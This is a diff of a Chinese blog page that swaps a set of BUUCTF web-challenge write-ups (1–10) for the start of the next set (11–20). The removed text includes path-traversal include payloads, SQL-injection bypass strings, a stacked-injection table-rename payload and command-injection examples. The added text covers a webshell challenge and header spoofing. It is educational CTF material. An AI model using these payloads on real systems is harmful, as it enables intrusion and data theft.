@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="buuctf练习[1-10], 计算机 网络安全 渗透测试">
+    <meta name="keywords" content="buuctf练习[11-20], 计算机 网络安全 渗透测试">
     <meta name="description" content="本科 | 软件工程 | 网络安全">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -17,7 +17,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>buuctf练习[1-10] | huhu</title>
+    <title>buuctf练习[11-20] | huhu</title>
 
     <link rel="icon" type="image/jpeg" href="/medias/tx.jpg">
 
@@ -429,12 +429,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/img/3.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/img/7.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">buuctf练习[1-10]</h1>
+                    <h1 class="description center-align post-title">buuctf练习[11-20]</h1>
                 </div>
             </div>
         </div>
@@ -580,7 +580,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-01-15
+                    2022-01-19
                 </div>
                 
 
@@ -594,14 +594,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    3k
+                    228
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    12 分
+                    1 分
                 </div>
                 
 
@@ -619,314 +619,35 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="1-HCTF-2018-Warmup"><a href="#1-HCTF-2018-Warmup" class="headerlink" title="1.[HCTF 2018]Warmup"></a>1.[HCTF 2018]Warmup</h2><p>考察：php审计：mb_substr()+mb_strpos()绕过</p>
-<p>打开题目地址后出现的是一个滑稽的表情，接着查看原码发现注释有 source.php ，访问后得到一段源码：</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">class</span> <span class="token class-name">emmm</span>
-    <span class="token punctuation">{</span>
-        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$page</span><span class="token punctuation">)</span>
-        <span class="token punctuation">{</span>
-            <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token double-quoted-string string">"source"</span><span class="token operator">=</span><span class="token operator">&gt;</span><span class="token double-quoted-string string">"source.php"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"hint"</span><span class="token operator">=</span><span class="token operator">&gt;</span><span class="token double-quoted-string string">"hint.php"</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//白名单</span>
-            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-                <span class="token keyword">echo</span> <span class="token double-quoted-string string">"you can't see it"</span><span class="token punctuation">;</span>
-                <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>
-            <span class="token punctuation">}</span>
-
-            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-                <span class="token keyword">return</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>
-            <span class="token punctuation">}</span>
-
-            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>
-                <span class="token variable">$page</span><span class="token punctuation">,</span>
-                <span class="token number">0</span><span class="token punctuation">,</span>
-                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'?'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'?'</span><span class="token punctuation">)</span>
-            <span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-                <span class="token keyword">return</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>
-            <span class="token punctuation">}</span>
-
-            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>
-                <span class="token variable">$_page</span><span class="token punctuation">,</span>
-                <span class="token number">0</span><span class="token punctuation">,</span>
-                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$_page</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'?'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'?'</span><span class="token punctuation">)</span>
-            <span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-                <span class="token keyword">return</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>
-            <span class="token punctuation">}</span>
-            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"you can't see it"</span><span class="token punctuation">;</span>
-            <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>
-        <span class="token punctuation">}</span>
-    <span class="token punctuation">}</span>
-
-    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
-        <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
-        <span class="token operator">&amp;&amp;</span> emmm<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment">//需要同时满足三个条件：传入了file参数，并且是字符串，并且满足checkfile函数</span>
-    <span class="token punctuation">)</span> <span class="token punctuation">{</span>
-        <span class="token keyword">include</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//执行给出的file参数值</span>
-        <span class="token keyword">exit</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
-        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>  
-<span class="token delimiter important">?&gt;</span></span> flag{408cfb51-0d75-4976-9d2e-e431e5d0fd77}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>先来介绍下两个函数mb_substr()+mb_strpos()：</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php">**mb_strpos()**：返回要查找的字符串在别一个字符串中首次出现的位置
-    mb_strpos(
-    string $haystack,
-    string $needle,
-):int
-// haystack：要被检查的字符串。
-// needle：要搜索的字符串
-
-**mb_substr()** 函数返回字符串的一部分。
-    mb_substr(
-    string $str,
-    int $start,
-    int $length = NULL,
-):string
-//str 必需。从该 string 中提取子字符串。
-//start 必需。规定在字符串的何处开始。
-//ength 可选。规定要返回的字符串长度。默认是直到字符串的结尾
-
-request() //可以以get或者post提交参数
-include //文件包含,包含并运行文件中的内容
-$_page . '?' //将$_page后拼接 ? 
-
-public static function checkFile(&amp;$page)
-&amp;&amp; emmm::checkFile($_REQUEST['file'])
-上面这代码表示 将request的file值 传入$page，其实就是将file参数传入到page中
-
-&amp;引用传递变量。这是通过在函数内建立一个本地变量并且该变量在呼叫范围内引用了同一个内容来实现的。例如： 
-	
-<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-    <span class="token keyword">function</span> sub <span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$var</span><span class="token punctuation">)</span>
-    <span class="token punctuation">{</span>
-        <span class="token variable">$var</span><span class="token operator">++</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
-    <span class="token variable">$num</span><span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">;</span>
-    <span class="token function">sub</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token delimiter important">?&gt;</span></span>
-
-将使 $num 变成 6。这是因为在 sub 函数中变量 $var 指向了和 $num 指向的同一个内容。
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>​    通过源码提示hin.php，访问之后得到flag在ffffllllaaaagggg中，所以我们肯定要使include包含这个文件，从而得到我们的flag。但是通过checkfile函数可知，返回true的条件是所传入的file参数值（或者是经过函数处理后的值）需要在白名单里，所以直接传入ffffllllaaaagggg肯定不得行。这是最终要的来啦，<strong>就是考虑题目给的函数，通过函数的处理的值使得我们能够返回true</strong>。所以构造payload为：</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token number">1.</span>file<span class="token operator">=</span>source<span class="token punctuation">.</span>php<span class="token operator">?</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>ffffllllaaaagggg
-<span class="token number">2.</span>file<span class="token operator">=</span>source<span class="token punctuation">.</span>php<span class="token operator">%</span><span class="token number">3</span>f<span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>ffffllllaaaagggg <span class="token comment">//这里的%3f是 ? 经过ulr加密后的值，由于每次传参十，都会自动urldecode一次，所以等价于第一个</span>
-<span class="token number">3.</span>file<span class="token operator">=</span>source<span class="token punctuation">.</span>php<span class="token operator">%</span><span class="token number">253</span>f<span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>ffffllllaaaagggg <span class="token comment">//这里的%253f是 ? 经过两次ulr加密后的值，在经过一次自动处理以及checkfile函数里的urldecode函数处理一次后就等价于第一个了，同样可以返回true</span>
-    
-<span class="token comment">//说明一下../是返回上一级目录，首先在source.php?加一个 / ，使其成为不存在的目录，然后../就返回到source.php所在的目录，之后一次次试在哪个目录里，自己也可以在本地试试../的目录关系</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>之后传入payload就会得到flag啦~</p>
-<p><strong>再补充一下 ./   ../   / 的说明：</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">
-./ 表示当前目录下
-../ 表示上一级目录
-/ 表示根目录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-
-<img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948708.png" style="zoom:150%;">
-
-<img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948710.png" style="zoom:150%;">
-
-<p>如图，以这个文件夹为例，在buu文件中，有2.png，那就表示为</p>
-<pre class="line-numbers language-none"><code class="language-none">./buuctf练习/1.png<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>在此目录下，有hello.md，那就表示为：</p>
-<pre class="line-numbers language-none"><code class="language-none">./hello.md 或者 hello.md<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>如果2.png在上层目录的一个image文件下，那就是：</p>
-<pre class="line-numbers language-none"><code class="language-none">../image/1.png<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-
-
-<hr>
-<h2 id="2-极客大挑战-2019-EasySQL"><a href="#2-极客大挑战-2019-EasySQL" class="headerlink" title="2.[极客大挑战 2019]EasySQL"></a>2.[极客大挑战 2019]EasySQL</h2><p>根据题目提示是SQL注入，所以先试着判断注入点和引号闭合方式：在username输入：1’，密码随便输：1，出现语法报错：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948711.png"></p>
-<p>则可以知道是单引号闭合，接着开始试试万能密码：1’ or 1=1#     ,则输入后后台语句大致就是：</p>
-<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select * from table_name where username='1' or 1=1 # ' and password='1' ;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>由于#会把后面的都注释掉，所以就等价于：</p>
-<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select * from table_name where username='1' or 1=1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>可知 1=1 是个恒等式，所以就登陆成功了，得到flag~</p>
-<p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948712.png"></p>
-<p>下面收集一些万能密码：</p>
-<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">'or'='or'
-'or 1=1--
-''or 1=1--
-'or'a'='a
-"or "a"="a
-"or"="a'='a
- ')or('a'='a
-or 1=1--
-a'or' 1=1--
-"or"="a'='a
-'or''='
-1 or '1'='1'=1
-1 or '1'='1' or 1=1
-'OR 1=1%00
-"or 1=1%00
-'xor
-admin' or 'a'='a 密码随便<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-
-<hr>
-<h2 id="3-极客大挑战-2019-Havefun"><a href="#3-极客大挑战-2019-Havefun" class="headerlink" title="3.[极客大挑战 2019]Havefun"></a>3.[极客大挑战 2019]Havefun</h2><p>这题还是比较简单的哈，进去之后就是一张可爱的猫猫图，有点乖哈哈，查看网页源代码，发现有一段PHP代码，就是get型参数传入：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948713.png"></p>
-<p>然后构造payload为：<a target="_blank" rel="noopener" href="http://49122460-5b04-4fd8-b15c-e5fad13e769c.node4.buuoj.cn:81/?cat=dog%E5%B0%B1%E5%8F%AF%E4%BB%A5%E4%BA%86">http://49122460-5b04-4fd8-b15c-e5fad13e769c.node4.buuoj.cn:81/?cat=dog就可以了</a>~</p>
-<hr>
-<h2 id="4-ACTF2020-新生赛-Include"><a href="#4-ACTF2020-新生赛-Include" class="headerlink" title="4.[ACTF2020 新生赛]Include"></a>4.[ACTF2020 新生赛]Include</h2><p>从题目可以看出来考察的是文件包含，进入题目看到tip，点击，网页进行了跳转，此时发现url为：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948714.png"></p>
-<p>可以看到后面有get型参数file值传入，此时传入参数后回显为这句话，那我们就直接通过==<strong>php://filter伪协议</strong>==读取整个flag.php，构造payload为：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948715.png"></p>
-<p>可以看到有一串base64加密的编码，解密后得到flag：</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token keyword">echo</span> <span class="token double-quoted-string string">"Can you find out the flag?"</span><span class="token punctuation">;</span>
-<span class="token comment">//flag{0f1d073a-d716-4aa6-ae19-16dbba744a1d}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
-
-
-<hr>
-<h2 id="5-强网杯-2019-随便注"><a href="#5-强网杯-2019-随便注" class="headerlink" title="5.[强网杯 2019]随便注"></a>5.[强网杯 2019]随便注</h2><p>从题目知应该是SQL注入，进入题目看到有一个输入框，输入 1 ，正常返回，加个<strong>单引号 1’</strong> 返回SQL语句错误，即存在SQL注入</p>
-<p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948716.png"></p>
-<p>然后使用order by 2,order by 3 查看列数，发现<strong>只有两列</strong></p>
-<p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948717.png"></p>
-<p>尝试使用联合查询union select 发现回显语是<strong>select被正则过滤</strong>了</p>
-<p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948718.png"></p>
-<p>emmm,开始大小写、联合注释等绕过waf,但是没得用就很气呦……，后来查了下资料原来是忽略掉的<font color="#FF5E3A" size="4">堆叠注入！</font>，那就开始直接查看表名：</p>
-<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">1';show tables; --+
-//在SQL中，分号（;）是用来表示一条sql语句的结束。堆叠注入就是结束一个sql语句后，会继续执行下一条构造的SQL语句。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948719.png"></p>
-<p>然后对应查看对应的列名：</p>
-<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">1';show columns from words; --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948720.png"></p>
-<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">1';show columns from `1919810931114514`; --+   //字符串为表名操作时要加反引号<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948721.png"></p>
-<p>这里可以看到我们要的flag是在对应的表中，根据第一次输入 1 的结果来看后台的语句应该是:</p>
-<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select * from words where id = <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>所以我们目前最重要的就是从另一个表中获得数据，但是我们只能从 “word” 这个表里取数据，然后看了别人的文章发现还可以<strong>改表的名称</strong>来读flag! 所以，思路就很清晰了：</p>
-<ol>
-<li>更改表的名称。将words改为随便其他的名字比如words1，然后将”1919810931114514”表的名字替换为words</li>
-<li>给新的words表增加一列id</li>
-</ol>
-<p>构造payload为（提醒：<font color="#FF5E3A" size="4"> 字符串为表名操作时要加反引号！！！</font>）：</p>
-<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">1';rename table words to word1;rename table `1919810931114514` to words;alter table words add id int unsigned not Null auto_increment primary key; --+
-//这里使用了rename和alert，具体用法可以查一下，不在正则过滤的范围内
-//注意一定要使用反引号！<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
-<p>接着再查看下表，其实就已经查出来flag了，啊tql，学到了~</p>
-<p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948722.png"></p>
-<p>最后感谢有人复现让我学习：<a target="_blank" rel="noopener" href="https://github.com/CTFTraining/qwb_2019_supersqli">https://github.com/CTFTraining/qwb_2019_supersqli</a></p>
-<hr>
-<h2 id="6-SUCTF-2019-EasySQL"><a href="#6-SUCTF-2019-EasySQL" class="headerlink" title="6.[SUCTF 2019]EasySQL"></a>6.[SUCTF 2019]EasySQL</h2><p>这题给我整不会了，刚开始试了联合不行，也没报错，报错注入也没了，布尔、时间也不得行了，又是看别人解题的一次，原来还可以猜后端代码:惊恐:。</p>
-<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select $_GET['query'] || flag from flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>然后构造payload为：*,1(或者其他常数)</p>
-<p>我接着自己在本地的test数据库尝试了一下，直接构造：</p>
-<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select 1 from salaries;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201171042456.png" style="zoom:150%;">
-
-<p>确实<strong>直接 select 一个常数会直接新增一个临时的列，并且每一行的数值都是这个常数</strong>，再来说一下这个 || ，在mysql里，<strong>只要 || 前面的成立，后面的便不再执行</strong>，同理，前面的不成立会执行后面的 。如果我们直接构造 :</p>
-<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select *||salary from salaries<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201171042458.png"></p>
-<p>可以看到会报语法错误，所以最终就是大佬的构造方法：</p>
-<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select *,1||salary from salaries<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201171042459.png" style="zoom:150%;">
-
-<p>可以看到新增加了一列并且这个表中的数据也都显示出来了，大佬们牛批！最后解题拿flag：</p>
-<img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201171042460.png" style="zoom:150%;">
-
-
-
-<h2 id="7-ACTF2020-新生赛-Exec"><a href="#7-ACTF2020-新生赛-Exec" class="headerlink" title="7.[ACTF2020 新生赛]Exec"></a>7.[ACTF2020 新生赛]Exec</h2><p>考察的是<strong>远程命令执行</strong>，emm我也是第一次做这种题，百度了一下网站的ping漏洞，发现可能存在远程执行命令的漏洞，就开始尝试~</p>
-<p>首先讲几个知识点：</p>
+                <hr>
+<h2 id="11-极客大挑战-2019-Knife"><a href="#11-极客大挑战-2019-Knife" class="headerlink" title="11.[极客大挑战 2019]Knife"></a>11.[极客大挑战 2019]Knife</h2><p>题目都告诉了是白给的shell，直接连就好了拿到webshell，找到根目录下有个flag，读取拿到flag:</p>
+<p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202201191659622.png"></p>
+<h2 id="12-极客大挑战-2019-Http"><a href="#12-极客大挑战-2019-Http" class="headerlink" title="12.[极客大挑战 2019]Http"></a>12.[极客大挑战 2019]Http</h2><p>考察的主要是http头部的一些信息，按着改就行了。首先那道题进入网页看到源码里面隐藏一个：<code>Secret.php</code>，进入后看到提示信息：</p>
+<p>It doesn’t come from ‘<a target="_blank" rel="noopener" href="https://sycsecret.buuoj.cn&amp;/#39;%EF%BC%8C%E7%9B%B4%E6%8E%A5%E6%8A%93%E5%8C%85%E6%94%B9%EF%BC%9A">https://Sycsecret.buuoj.cn'，直接抓包改：</a></p>
 <ul>
-<li><p><strong>命令连接符</strong></p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cmd1 <span class="token punctuation">;</span> cmd2 <span class="token punctuation">;</span> cmd3         分号 <span class="token punctuation">;</span> 可以进行多条命令的无关联执行，每一条执行结果不会影响其他命令的执行
-cmd1 <span class="token operator">&amp;&amp;</span> cmd2               左边的command1执行成功<span class="token punctuation">(</span>返回0表示成功<span class="token punctuation">)</span>后，  <span class="token operator">&amp;&amp;</span>  右边的command2才能被执行。
-cmd1 <span class="token operator">|</span> cmd2                <span class="token operator">|</span> 表示管道，上一条命令的输出，作为下一条命令的输入
-cmd1 <span class="token operator">||</span> cmd2               <span class="token operator">||</span> 表示上一条命令执行失败后，才执行下一条命令<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-</li>
+<li>加个<code>Referer</code>: <a target="_blank" rel="noopener" href="https://sycsecret.buuoj.cn,/">https://Sycsecret.buuoj.cn，</a></li>
 </ul>
-<p>下面开始做题：</p>
-<p>首先<code>ls</code>查看一下当前目录有没有flag文件等，发现没得：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201171042461.png"></p>
-<p>然后尝试遍历父目录可以看到有flag文件：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201171042462.png"></p>
-<p>这样直接<code>cat ../../../flag</code>拿到flag:</p>
-<p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201171042463.png"></p>
-<h2 id="8-极客大挑战-2019-Secret-File"><a href="#8-极客大挑战-2019-Secret-File" class="headerlink" title="8.[极客大挑战 2019]Secret File"></a>8.[极客大挑战 2019]Secret File</h2><p>考察的是<strong>伪协议读取文件</strong>，难点就是怎么读到flag.php中的flag。</p>
-<p>进入题目查看源代码发现提示有：/Archive_room.php ，接着点发现有：/action.php ，但是访问直接过去了跳到：/end.php，开始抓包：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201171145471.png"></p>
-<p>发现有secr3t.php，访问之后看到一段代码：</p>
-<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>
-    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>secret<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>
-    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
-<span class="token prolog">&lt;?php
-    highlight_file(__FILE__);
-    error_reporting(0);
-    $file=$_GET['file'];
-    if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data")){
-        echo "Oh no!";
-        exit();
-    }
-    include($file); 
-//flag放在了flag.php里
-?&gt;</span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span>							 					<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202201191659623.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202201191659625.png"></p>
+<ul>
+<li>看到又说必须使用”syclover browser”,接着改<code>User-Agent</code></li>
+</ul>
+<img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202201191659626.png" style="zoom:150%;">
 
-<p>直接访问flag.php会出现贱贱的话，看不到flag，看到php代码里有过滤的，先解释下这两个函数：</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">strstr</span><span class="token punctuation">(</span>string<span class="token punctuation">,</span>search<span class="token punctuation">,</span>before_search<span class="token punctuation">)</span>
-	搜索字符串在另一字符串中的第一次出现。
-	返回字符串的剩余部分（从匹配点）。如果未找到所搜索的字符串，则返回 <span class="token boolean constant">FALSE</span>。
- 
-<span class="token function">stristr</span><span class="token punctuation">(</span>string<span class="token punctuation">,</span>search<span class="token punctuation">,</span>before_search<span class="token punctuation">)</span>
